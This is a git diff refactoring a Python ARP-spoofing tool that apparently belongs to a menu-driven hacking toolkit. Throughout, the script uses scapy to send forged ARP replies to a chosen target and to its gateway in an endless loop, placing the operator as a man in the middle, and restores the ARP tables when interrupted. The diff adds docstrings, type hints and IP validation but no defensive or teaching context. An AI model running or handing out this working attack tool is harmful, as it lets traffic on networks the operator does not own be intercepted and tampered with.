@@ -1,23 +1,34 @@
 from Settings.Utils import *
-from Settings.Config import *
 
 print(banner)
 
 try:
-    import time
     import scapy.all as scapy
 except ImportError:
     module_error()
-    exit()
 
-def get_mac(ip):
+def get_mac(ip: str) -> str:
+    """Get the MAC address of a device on the network
+
+    Args:
+        ip (str): The IP address of the device
+
+    Returns:
+        str: The MAC address of the device
+    """
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip: str, spoof_ip: str):
+    """Spoof the ARP table of a target device
+
+    Args:
+        target_ip (str): The IP address of the target device
+        spoof_ip (str): The IP address to spoof
+    """
     ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arp = scapy.ARP(op=1, pdst=target_ip, psrc=spoof_ip)
 
@@ -25,7 +36,13 @@ def spoof(target_ip, spoof_ip):
 
     scapy.sendp(packet, verbose=False)
 
-def restore(destination_ip, source_ip):
+def restore(destination_ip: str, source_ip: str):
+    """Restore the ARP table of a target device
+
+    Args:
+        destination_ip (str): The IP address of the target device
+        source_ip (str): The IP address to restore
+    """
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
 
@@ -36,26 +53,34 @@ def restore(destination_ip, source_ip):
     packet = ether/arp
     scapy.sendp(packet, verbose=False)
 
-def arp_spoof(target_ip, gateway_ip):
+def arp_spoof(target_ip: str, gateway_ip: str):
+    """ARP spoofing attack
+
+    Args:
+        target_ip (str): The IP address of the target device
+        gateway_ip (str): The IP address of the gateway
+    """
     try:
         sent_packets_count = 0
         while True:
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             sent_packets_count += 2
-            print(f"\r[{green}+{reset}] Packets sent: {sent_packets_count}", end="")
+            print_message(f"Packets sent: {sent_packets_count}")
             time.sleep(2)
     except KeyboardInterrupt:
-        print(f"\n[{red}+{reset}] Detected CTRL + C... Resetting ARP tables... Please wait.")
+        print_error("Detected CTRL + C... Resetting ARP tables... Please wait.")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
-        print(f"[{green}+{reset}] ARP tables restored.")
-        print(f"[{green}+{reset}] Exiting...")
+        print_message("ARP tables restored.")
+        print_message("Exiting...")
         time.sleep(2)
         clear()
         return
     
 def arp_spoof_menu():
+    """ARP spoofing menu
+    """
     print(f"""{red}
                                                                 ========================================
                                                                 |{green}             ARP Spoofing             {red}|
@@ -63,22 +88,28 @@ def arp_spoof_menu():
     
 Be sure targets are on the same network as you. ARP Spoofing only works locally.
     {reset}""")
+
+    while True:
+        
+        target_ip = input(f"{message_start} Enter the target IP address (or Q to quit): {reset}")
+
+        if target_ip == "Q" or target_ip == "q":
+            return
+        
+        gateway_ip = input(f"{message_start} Enter the gateway IP address: {reset}")
+
+        if validate_ip(target_ip) and validate_ip(gateway_ip):
+            break
     
-    target_ip = input(f"{red}[{green}+{red}]{white} Enter the target IP address (or Q to quit): {reset}")
-
-    if target_ip == "Q" or target_ip == "q":
-        return
-    
-    gateway_ip = input(f"{red}[{green}+{red}]{white} Enter the gateway IP address: {reset}")
-
-
-
-    
-    print(f"{red}[{green}+{red}]{white} ARP spoofing target {target_ip} on the network...{reset}")
+    print_message(f"ARP spoofing target {target_ip} on the network...")
     arp_spoof(target_ip, gateway_ip)
     
-    input(f"{red}[{green}+{red}]{white} Press Enter to return to the main menu...{reset}")
+    wait_user()
     return
 
-arp_spoof_menu()
 
+try:
+    arp_spoof_menu()
+except Exception as e:
+    print_error(f"An error occurred: {e}")
+    wait_user()
